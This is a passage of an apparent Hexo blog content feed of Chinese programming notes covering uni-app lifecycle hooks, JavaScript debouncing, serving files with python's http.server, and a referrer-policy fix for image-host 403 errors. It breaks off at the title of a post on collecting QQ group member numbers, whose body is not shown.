class="line"><span class="punctuation">{</span></span><br><span class="line">  <span class="attr">"path"</span><span class="punctuation">:</span> <span class="string">"goods_list/goods_list"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"style"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"enablePullDownRefresh"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">}</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure><ul><li>在处理完数据刷新后，调用 <code>uni.stopPullDownRefresh()</code> 来结束下拉刷新状态。</li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> {</span><br><span class="line">  <span class="title function_">onPullDownRefresh</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"用户触发了下拉刷新"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 模拟数据请求</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">fetchData</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">      <span class="comment">// 数据加载完成后，停止下拉刷新</span></span><br><span class="line">      uni.<span class="title function_">stopPullDownRefresh</span>();</span><br><span class="line">    });</span><br><span class="line">  },</span><br><span class="line">  <span class="attr">methods</span>: {</span><br><span class="line">    <span class="title function_">fetchData</span>(<span class="params">callback</span>) {</span><br><span class="line">      <span class="comment">// 这里可以调用 API 或执行其他操作来获取新数据</span></span><br><span class="line">      <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"数据刷新完成"</span>);</span><br><span class="line">        callback &amp;&amp; <span class="title function_">callback</span>();</span><br><span class="line">      }, <span class="number">2000</span>); <span class="comment">// 模拟延迟</span></span><br><span class="line">    },</span><br><span class="line">  },</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>在 UniApp 中，<code>onReachBottom()</code> 默认是在页面滚动到离底部 50px 位置时触发。不过在 <code>pages.json</code> 文件中，可以配置 <code>onReachBottomDistance</code> 属性来调整触底的距离。这个属性指定了页面滚动到底部时触发 <code>onReachBottom()</code> 事件的距离（单位 px）。例如，将触底距离设为 150px</p><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">  <span class="attr">"path"</span><span class="punctuation">:</span> <span class="string">"goods_list/goods_list"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"style"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"enablePullDownRefresh"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"onReachBottomDistance"</span><span class="punctuation">:</span> <span class="number">150</span></span><br><span class="line">  <span class="punctuation">}</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure><h3 id="7-onreachbottom"><a class="markdownIt-Anchor" href="#7-onreachbottom"></a> 7、onReachBottom()</h3><ul><li>页面上拉触底事件的处理函数。</li><li>用户上拉到页面底部时触发，常用于加载更多数据的场景。</li></ul><h3 id="8-onpagescrollobject"><a class="markdownIt-Anchor" href="#8-onpagescrollobject"></a> 8、onPageScroll(object</h3><ul><li>页面滚动时触发，可以获取页面的滚动距离。</li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">onPageScroll</span>(<span class="params">event</span>) {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'页面滚动'</span>, event.<span class="property">scrollTop</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="9-onshareappmessage"><a class="markdownIt-Anchor" href="#9-onshareappmessage"></a> 9、onShareAppMessage()</h3><ul><li>用户点击右上角分享时触发，返回自定义的分享内容。</li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">onShareAppMessage</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">return</span> {</span><br><span class="line">    <span class="attr">title</span>: <span class="string">'分享标题'</span>,</span><br><span class="line">    <span class="attr">path</span>: <span class="string">'/pages/index/index'</span></span><br><span class="line">  };</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="应用程序生命周期"><a class="markdownIt-Anchor" href="#应用程序生命周期"></a> 应用程序生命周期</h2><p>这些生命周期钩子是针对整个应用程序的，在不同的应用场景下会被触发。</p><h3 id="1-onlaunch"><a class="markdownIt-Anchor" href="#1-onlaunch"></a> 1、onLaunch()</h3><ul><li>当应用首次启动时触发，通常用于执行一些全局的初始化操作。</li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">onLaunch</span>(<span class="params">options</span>) {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'应用启动'</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="2-onshow-2"><a class="markdownIt-Anchor" href="#2-onshow-2"></a> 2、onShow()</h3><ul><li>当应用从后台进入前台显示时触发。</li><li>类似页面生命周期中的 <code>onShow</code>，但是作用于整个应用。</li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">onShow</span>(<span class="params">options</span>) {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'应用显示'</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="3-onhide"><a class="markdownIt-Anchor" href="#3-onhide"></a> 3、onHide()</h3><ul><li>当应用进入后台时触发。</li><li>可以在这里处理数据保存、暂停定时器等操作。</li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">onHide</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'应用隐藏'</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="4-onerror"><a class="markdownIt-Anchor" href="#4-onerror"></a> 4、onError()</h3><ul><li>当应用发生 JavaScript 错误时触发。</li><li>常用于全局错误监控。</li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">onError</span>(<span class="params">err</span>) {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">'应用出错'</span>, err);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="5-onpagenotfound"><a class="markdownIt-Anchor" href="#5-onpagenotfound"></a> 5、onPageNotFound()</h3><ul><li>当页面路径不存在时触发，通常用于重定向到一个有效页面。</li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">onPageNotFound</span>(<span class="params">res</span>) {</span><br><span class="line">  uni.<span class="title function_">redirectTo</span>({</span><br><span class="line">    <span class="attr">url</span>: <span class="string">'/pages/404/404'</span></span><br><span class="line">  });</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="小程序平台专属生命周期"><a class="markdownIt-Anchor" href="#小程序平台专属生命周期"></a> 小程序平台专属生命周期</h2><h3 id="1-onresize小程序平台专属"><a class="markdownIt-Anchor" href="#1-onresize小程序平台专属"></a> 1、onResize ()（小程序平台专属）</h3><ul><li>当小程序窗口尺寸发生变化时触发，通常在设备旋转时使用。</li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">onResize</span>(<span class="params">size</span>) {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'窗口尺寸变化'</span>, size);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="2-ontabitemtapitem小程序平台专属"><a class="markdownIt-Anchor" href="#2-ontabitemtapitem小程序平台专属"></a> 2、onTabItemTap (item)（小程序平台专属）</h3><ul><li>监听 tab 页点击的事件。</li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">onTabItemTap</span>(<span class="params">item</span>) {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'Tab 被点击'</span>, item);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>此笔记随时可能更新，总感觉还是见得少了……</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> uni-app </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>理解防抖</title>
      <link href="/posts/35829.html"/>
      <url>/posts/35829.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><h2 id="为什么需要防抖"><a class="markdownIt-Anchor" href="#为什么需要防抖"></a> 为什么需要防抖</h2><p>防抖主要应用在一些高频率触发的事件中，比如：<code>scroll</code> 滚动、<code>input</code> 输入、<code>resize</code> 缩放等，能显著降低性能开销。</p><h2 id="什么是防抖"><a class="markdownIt-Anchor" href="#什么是防抖"></a> 什么是防抖</h2><p>防抖的核心思想是：高频率触发的事件中，仅保留最后一次操作，之前的操作都会被取消。</p><p>举例来说，当你在页面中不断滚动，防抖函数会等待设定的一段时间，如果这段时间内没有再次触发滚动，才会执行处理逻辑；否则会重新计时，直到用户 “安静下来” 再执行操作。</p><p>防抖函数的一般形式如下：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">debounce</span>(<span class="params">fn, delay</span>) {</span><br><span class="line">  <span class="comment">// fn为传入的函数名</span></span><br><span class="line">  <span class="keyword">let</span> timer = <span class="literal">null</span>; <span class="comment">// 用来保存定时器的 ID</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">...args</span>) {</span><br><span class="line">    <span class="comment">// 返回一个闭包函数</span></span><br><span class="line">    <span class="keyword">if</span> (timer) <span class="built_in">clearTimeout</span>(timer); <span class="comment">// 若已有定时器则清除它</span></span><br><span class="line">    timer = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">      <span class="comment">// 设置一个新的定时器</span></span><br><span class="line">      <span class="comment">// 当延时结束时，执行传入的函数，并绑定当前的上下文和参数</span></span><br><span class="line">      fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>, args);</span><br><span class="line">    }, delay); <span class="comment">// delay 是等待的时间，单位是毫秒 ms</span></span><br><span class="line">  };</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="使用示例"><a class="markdownIt-Anchor" href="#使用示例"></a> 使用示例</h2><p>假设我们有一个函数 <code>handleScroll</code>，它在页面滚动时处理一些操作，我们不希望它每次滚动都触发，因为这会增加不必要的性能消耗，我们希望它在滚动停止后执行，那么可以这样使用防抖函数</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">handleScroll</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"处理滚动事件中..."</span>);</span><br><span class="line">  <span class="comment">// 实际逻辑略</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用防抖包装滚动事件处理函数，等待300毫秒</span></span><br><span class="line"><span class="keyword">const</span> debouncedHandleScroll = <span class="title function_">debounce</span>(handleScroll, <span class="number">300</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当页面滚动时</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">"scroll"</span>, debouncedHandleScroll);</span><br></pre></td></tr></tbody></table></figure><p>这样处理后，滚动事件停止 300ms 后才会触发 <code>handleScroll</code>，大大减少了触发频率。</p><h2 id="理解防抖函数"><a class="markdownIt-Anchor" href="#理解防抖函数"></a> 理解防抖函数</h2><p>每次触发 <code>debounce</code> 返回的函数时：</p><ol><li>如果存在旧的定时器，则先清除；</li><li>然后设置一个新的定时器；</li><li>只有在用户停止触发事件一段时间后，才执行原始函数。</li></ol><p>换句话说：</p><p><strong>多次触发事件时，只有最后一次触发后的延迟时间结束后才会执行目标函数。</strong></p><h2 id="什么是-timer"><a class="markdownIt-Anchor" href="#什么是-timer"></a> 什么是 timer？</h2><p><code>timer</code> 是由 <code>setTimeout</code> 返回的定时器标识符，用来取消未完成的定时任务。</p><p>具体来说，setTimeout 的返回值是一个定时器的标识符 <code>ID</code>。而定时器的 ID 的类型因环境不同也有所差异：在浏览器环境中，setTimeout 的返回是一个数值类型的 ID，例如第一次调用可能返回 1，第二次为 2，依次递增；在 Node.js 环境中，setTimeout 返回值可能是一个定时器对象，但仍然可以通过 clearTimeout 消除。当然也可以将 timer 写作别的名称，只要合法都行，但为了直观还是建议写成 timer</p><h2 id="为什么要每次清除旧定时器"><a class="markdownIt-Anchor" href="#为什么要每次清除旧定时器"></a> 为什么要每次清除旧定时器？</h2><p>如果不清除旧的定时器，每次事件触发都会设置一个新的定时器，导致多个定时器同时生效，函数可能会被多次调用，完全违背了 “只执行最后一次” 的目的。</p><p>现在，假设每次开始都清除定时器，那么当前的滑动事件会将上一次的滑动事件定时清除，并为自己这一次的滑动事件进行定时，而这一次若为最后一次，函数将不再会被调用，也就不再会清除定时器，这一次的事件将会被正确的以设置好的时间定时进行处理。</p><h3 id="电梯门的防抖类比"><a class="markdownIt-Anchor" href="#电梯门的防抖类比"></a> 电梯门的防抖类比</h3><p>这种事件可以类比生活中的乘电梯事件：将电梯门看作事件处理函数，进入电梯的这一动作看作不希望的高频次事件。当人按下电梯按钮，电梯抵达并开门，开门的同时开始计时，每有一个人被红外检测到，人经过电梯门进入电梯之后，电梯门的计时就重新开始（清除上一次的计时），直到没有人进入（高频次事件停止，进入电梯的最后一个人为最后的事件），电梯门最终关闭（定时器时间到了），电梯执行上升或下降等约定好的操作（执行回调函数）。</p><p>即：</p><ol><li>每当一个人进入电梯，门会重新计时关门；</li><li>如果不断有人进来，门就不会关；</li><li>直到没人再进来，计时器才不会被清除，门会在设定时间后关闭。</li></ol><p>这个<strong>直到没人再进来</strong>的延迟，就是防抖的关键。</p><h2 id="为什么不将-timer-写在外部为什么返回一个闭包函数"><a class="markdownIt-Anchor" href="#为什么不将-timer-写在外部为什么返回一个闭包函数"></a> 为什么不将 timer 写在外部？为什么返回一个闭包函数？</h2><p><code>timer</code> 在功能上看，当然可以作为全局变量定义在整个函数外部，但是这样一来如果别处也要使用 <code>timer</code> 就会显得不太合适，<code>timer</code> 会被污染，不便于函数的封装复用，并且还存在安全问题，将其私有化是一个好的选择。</p><p>此外闭包可以记录外部变量的状态（这主要依靠作用域链），这样能保证多次触发事件访问到的是<strong>同一个</strong><code>timer</code>，保证多次事件触发能清除到<strong>前一个事件</strong>的定时，最终实现防抖。</p><h2 id="这闭包到底是啥"><a class="markdownIt-Anchor" href="#这闭包到底是啥"></a> 这闭包到底是啥？</h2><p><strong>闭包</strong>（closure）是 JavaScript 中一个重要的概念，<strong>闭包</strong>是指一个函数可以访问它外部函数作用域中的变量，即使在外部函数已经执行结束后，它仍然可以通过引用这些变量。</p><p>什么意思呢？假设有这样一个函数</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">createCounter</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">    count += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  };</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> counter = <span class="title function_">createCounter</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">counter</span>()); <span class="comment">// 输出 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">counter</span>()); <span class="comment">// 输出 2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">counter</span>()); <span class="comment">// 输出 3</span></span><br></pre></td></tr></tbody></table></figure><p>按理说一个函数 return 之后函数本身就已经 over 了，但是 counter 还是能够访问到 count 的值，并进行了累加。类似这样的一个返回的函数就是闭包。闭包一般是在<strong>函数嵌套</strong>的情况下形成的。当一个函数 <code>A</code> 返回另一个内部函数 <code>B</code>，并且 <code>B</code> 可以访问 <code>A</code> 函数内部定义的变量时，闭包就形成了。</p><h2 id="args是什么为什么"><a class="markdownIt-Anchor" href="#args是什么为什么"></a> <code>...args</code> 是什么？为什么？</h2><p>在 JavaScript 中，<code>...args</code> 是一种称为 <strong>剩余参数（Rest Parameters）</strong> 的语法，它用于将函数的<strong>不定数量的参数</strong>收集到一个数组中。这样可以让函数接受任意数量的参数，并将它们组合在一起，便于操作和处理。</p><p>说到为什么要使用它，还得说说它的好处。假设有这样一个函数</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">logArguments</span>(<span class="params">...args</span>) {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(args); <span class="comment">// args 是一个数组，包含了所有传入的参数</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="title function_">logArguments</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>); <span class="comment">// 输出 [1, 2, 3]</span></span><br><span class="line"><span class="title function_">logArguments</span>(<span class="string">"a"</span>, <span class="string">"b"</span>); <span class="comment">// 输出 ["a", "b"]</span></span><br><span class="line"><span class="title function_">logArguments</span>(); <span class="comment">// 输出 []</span></span><br></pre></td></tr></tbody></table></figure><p>不论传入多少参数，有还是没有，它都能够接收并存储在 <code>args</code> 数组中。</p><p>那为什么防抖中要用到呢？</p><p>一来是为了使得函数能够处理任意数量的参数，使其更通用；二来是为了能够<strong>正确</strong>地传递参数。</p><p>可别不以为意，有时候还真没多少人能正确地传递参数。</p><h2 id="节流"><a class="markdownIt-Anchor" href="#节流"></a> 节流</h2><div class="note warning flat"><p>⚠️ 防抖（debounce）和节流（throttle）经常被搞混：</p><ul><li>防抖：N 秒内事件不断触发，只执行最后一次（停止触发 N 秒后执行）</li><li>节流：N 秒内只执行一次（无论触发多少次，都限制频率）</li></ul></div><h3 id="节流适用场景"><a class="markdownIt-Anchor" href="#节流适用场景"></a> 节流适用场景</h3><ul><li>无限滚动分页加载</li><li>页面滚动触发动画</li><li>鼠标移动实时反馈等</li></ul><h2 id="防抖变种立即执行immediate"><a class="markdownIt-Anchor" href="#防抖变种立即执行immediate"></a> 防抖变种：立即执行（<code>immediate</code>）</h2><p>上述讨论的是 “<strong>非立即执行的防抖</strong>”，即：<strong>等事件不再触发后才执行一次</strong>。</p><p>有时我们希望<strong>首次触发立即执行函数</strong>，后续触发不再响应，直到一段时间之后再允许触发，这就属于 “<strong>立即执行防抖</strong>”。例如：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">debounce</span>(<span class="params">fn, delay, immediate = <span class="literal">false</span></span>) {</span><br><span class="line">  <span class="keyword">let</span> timer = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">...args</span>) {</span><br><span class="line">    <span class="keyword">const</span> context = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="keyword">if</span> (timer) <span class="built_in">clearTimeout</span>(timer);</span><br><span class="line">    <span class="keyword">if</span> (immediate &amp;&amp; !timer) {</span><br><span class="line">      fn.<span class="title function_">apply</span>(context, args); <span class="comment">// 首次立即执行</span></span><br><span class="line">    }</span><br><span class="line">    timer = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">      <span class="keyword">if</span> (!immediate) fn.<span class="title function_">apply</span>(context, args); <span class="comment">// 非立即执行逻辑</span></span><br><span class="line">      timer = <span class="literal">null</span>;</span><br><span class="line">    }, delay);</span><br><span class="line">  };</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这种变种适用场景例如：</p><ul><li>用户首次输入时立即触发搜索建议</li><li>防止按钮被连续点击：首次有效，接下来点击无效</li><li>页面初始化后的 resize 初始化布局等</li></ul><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><table><thead><tr><th>类型</th><th>执行时机</th><th>典型场景</th></tr></thead><tbody><tr><td>防抖 Debounce</td><td> 停止触发后一段时间执行</td><td>输入框搜索、滚动监听、resize</td></tr><tr><td> 节流 Throttle</td><td> 固定频率执行</td><td>上拉加载、鼠标移动、FPS 控制等</td></tr><tr><td>立即执行防抖</td><td>首次触发立即执行</td><td>快速响应用户操作（防重复点击）</td></tr></tbody></table><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 python 创建简易的 http 服务传递文件</title>
      <link href="/posts/22192.html"/>
      <url>/posts/22192.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><h2 id="1-cd命令到你想要起服务的目录"><a class="markdownIt-Anchor" href="#1-cd命令到你想要起服务的目录"></a> 1、cd 命令到你想要起服务的目录</h2><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html</span><br><span class="line">/*仅举例*/</span><br></pre></td></tr></tbody></table></figure><h2 id="2-在终端运行"><a class="markdownIt-Anchor" href="#2-在终端运行"></a> 2、在终端运行</h2><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3.8 -m http.server 7777（python3）</span><br><span class="line"></span><br><span class="line">python3.8 -m SimpleHTTPServer 6666（python2）</span><br></pre></td></tr></tbody></table></figure><p>请将上面的四位数数字端口号替换成你想要的端口，不出意外你会得到</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202303111111599.png" alt="image-20230311111120223"></p><p>这样就是正常的了。</p><h2 id="3-连接"><a class="markdownIt-Anchor" href="#3-连接"></a> 3、连接</h2><p>Linux 系统下：<br>如果你是虚拟机，请使用 <code>ifconfig</code> 查询到你的 ip，然后用 <strong>你查询到的 ip: 端口</strong> 进行连接；<br>如果你是公网服务器，直接使用 <strong>你的公网 ip: 端口</strong> 即可（请记得开放你所需要的端口）</p><p>Win 的话，查询 <code>ip</code> 请使用 <code>ipconfig</code><br>连接操作和上面一致</p><p>连接效果如下</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202303111116954.png" alt="image-20230311111615917"></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 随想随记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> http </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决 hexo 主题无法显示使用相对路径的图床图片</title>
      <link href="/posts/55208.html"/>
      <url>/posts/55208.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><h2 id="问题情况"><a class="markdownIt-Anchor" href="#问题情况"></a> 问题情况</h2><p>本地预览查看明明使用图床的图片缺无法正常显示，报 403 问题，显示如下</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/image-20240626004028362.png" alt="image-20240626004028362"></p><h2 id="原因"><a class="markdownIt-Anchor" href="#原因"></a> 原因</h2><p>http 请求体的 header 中有一个 referrer 字段，用来表示发起 http 请求的源地址信息，这个 referrer 信息是可以省略但是不可修改的，只能设置是否带上这个 referrer 信息，而不能定制 referrer 里面的值。</p><p>服务器端在拿到这个 referrer 值后就可以进行相关的处理，比如图片资源，可以通过 referrer 值判断请求是否来自本站，若不是则返回 403 或者重定向返回其他信息，从而实现图片的防盗链。上面出现 403 就是因为，请求的是别人服务器上的资源，但把自己的 referrer 信息带过去了，被对方服务器拦截返回了 403。</p><h2 id="解决"><a class="markdownIt-Anchor" href="#解决"></a> 解决</h2><p>前端可以通过 meta 来设置 referrer policy (来源策略)，具体参考<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Referrer-Policy">这里</a>。浏览器中 referrer 默认的值是 <code>no-referrer-when-downgrade</code>，就是除了降级请求的情况以外都会带上 referrer 信息。降级请求是指 https 协议的地址去请求 http 协议，所以 403 的情况可以将请求的图片地址换成 http 协议，这样降级请求也不会带上 referrer。另一种推荐的方法是把 referrer 设置成 <code>no-referrer</code>，这样发送请求不会带上 referrer 信息，对方服务器也就无法拦截。</p><p>由于我个人使用的主题为 <code>fluid</code>，暂未找到可以直接修改的配置文件进行添加配置项配置 meta，所以采用的是每次写 md 文档时，在开头加上</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"referrer"</span> <span class="attr">content</span>=<span class="string">"no-referrer"</span> /&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>无需额外设置，如果使用的是 typora 会直接识别</p><p>如果你的主题可以找到配置文件进行 meta 项的添加修改，可以加上下面这句</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meta(name="referrer" content="no-referrer")</span><br></pre></td></tr></tbody></table></figure><p>最后别忘了使用 <code>hexo g</code> 重新生成一下，确认可行之后使用 <code>hexo d</code> 同步即可</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 随想随记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo图片问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用浏览器爬取 qq 群的用户 qq 号</title>
      <link href="/posts/17306.html"/>
